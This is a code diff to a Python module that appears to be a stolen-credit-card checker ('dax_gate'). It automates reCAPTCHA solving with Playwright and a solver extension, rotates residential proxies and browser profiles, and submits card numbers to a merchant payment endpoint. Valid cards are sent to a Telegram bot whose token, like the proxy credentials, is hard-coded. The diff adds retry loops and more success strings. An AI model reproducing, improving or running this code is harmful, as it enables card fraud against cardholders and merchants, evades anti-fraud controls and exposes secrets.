@@ -1,7 +1,7 @@
 import httpx
 import os
 from playwright.sync_api import Playwright, Page
-from playwright.async_api import async_playwright
+from playwright.async_api import async_playwright, Browser
 from playwright_recaptcha import recaptchav2, RecaptchaSolveError
 import asyncio
 from randomuser import RandomUser
@@ -11,8 +11,11 @@ import requests
 import re
 import time
 import json
+import psutil
+from gates.utils.browser_profile import generate_profile
 error_response = ['Invalid merchant information: 57-Terminal is not programmed for this service - call Customer Support',
-                  'captchaError'
+                  'captchaError',
+                  'Invalid Attempt.'
                   ]
 class dax_gate:
     page = None
@@ -56,19 +59,28 @@ def get_enumproxy():
     return f"{host}:{port}"
 
 
-async def solve(url, p):
-    user_data_dir = "~/tmp/user-data-dir"
-    firefo_ext = f"{cdir}/firefox-extension/buster_captcha_solver-2.0.1.xpi"
+async def solve(url, p, ua, user_data_dir):
 
+    firefo_ext = f"{cdir}/firefox-extension/buster_captcha_solver-2.0.1.xpi"
+    # for proc in psutil.process_iter():
+    #     try:
+    #         if 'firefox' in proc.name() and 'playwright' in ' '.join(proc.cmdline()):
+    #             print('Firefox with Playwright is running')
+    #             proc.kill()
+    #             break
+    #     except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+    #         pass
+    # else:
+    #     print('Firefox with Playwright is not running')
     page = None
     port = random.randint(10100, 10120)
     port_rotate = random.randint(9000, 9002)
     username = "geonode_JFNTdE7PxE"
     password = "1c348b0d-606e-4a50-a71e-442329fc9212"
     GEONODE_DNS = f"premium-residential.geonode.com:{port}"
-    
+
     async with async_playwright() as playwright:
-        ua = UserAgent()
+        
         args = [
             "--deny-permission-prompts",
             "--no-default-browser-check",
@@ -78,7 +90,7 @@ async def solve(url, p):
             "--ignore-certificate-errors",
             "--no-service-autorun",
             "--password-store=basic",
-            f"--user-agent={ua['Firefox']}",
+            f"--user-agent={ua}",
             "--headless=new",  # the new headless arg for chrome v109+. Use '--headless=chrome' as arg for browsers v94-108.
             f"--disable-extensions-except={firefo_ext}",
             f"--load-extension={firefo_ext}",
@@ -116,7 +128,7 @@ async def solve(url, p):
             print(f"Captcha Error: {reError}")
             await page.close()
             await context.close()
-            return "captchaError"
+            # return "captchaError"
         # except:
         #     await page.close()
         #     await context.close()
@@ -141,9 +153,9 @@ def find_between(data, first, last):
 #          latin_pattern = re.compile(r'^[a-zA-Z\s]+$')
 #     return user
 
-def process_check(cc):
-    p=get_enumproxy()
-    reqUrl = getUrl()
+def process_check(cc, p, reqUrl, ua, user_data_dir):
+    
+    
     donotion = None
     reqver = None
     insta = None
@@ -177,7 +189,7 @@ def process_check(cc):
         reqver, donotion, insta, cookies = req_one()
 
         # insta = insta.split('-')[1]
-        gResponse = asyncio.run(solve(reqUrl, p))
+        gResponse = asyncio.run(solve(reqUrl, p, ua, user_data_dir))
         if gResponse:
             print(reqver)
             print(donotion)
@@ -227,7 +239,7 @@ def process_check(cc):
                 data=payload,
                 headers=headersList,
             ).text
-            if '"success":true' in data or "CVV2/VAK Failure" in data or "CVV2 Mismatch" in data:
+            if '"success":true' in data or "CVV2/VAK Failure" in data or "CVV2 Mismatch" in data or "Approved" in data:
                 requests.get('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text=' + cc)
         
             # respo = await get_response(navigate)
@@ -236,17 +248,27 @@ def process_check(cc):
             
                 
             return data
-    b = None
-    err = True
-    
-    while err == True:
-        time.sleep(5)  # import time
-        p = get_enumproxy()
-        b = req_two()
-        errormsg = find_between(b, '"error_message":"','"')
-        if errormsg in error_response:
-            err = True
+    return req_two()
+
+def process_all(cc, profile):   
+
+    proces=None
+    tries = 0
+    limit = 10
+    while proces != "Done" and tries <= limit:
+        time.sleep(1)  # import time
+        p=get_enumproxy()
+        reqUrl = getUrl()
+        if tries >= 5:
+            profile = generate_profile()
+        print(profile)
+        ua = UserAgent()
+        ua = ua['Firefox']
+        result =  process_check(cc, p, reqUrl, ua, profile)
+        errormsg = find_between(result, '"error_message":"','"')
+        if errormsg not in error_response:
+            proces = "Done"
         else:
-            err = False
-    return b
+            proces = "Not Done"
+    return result
     
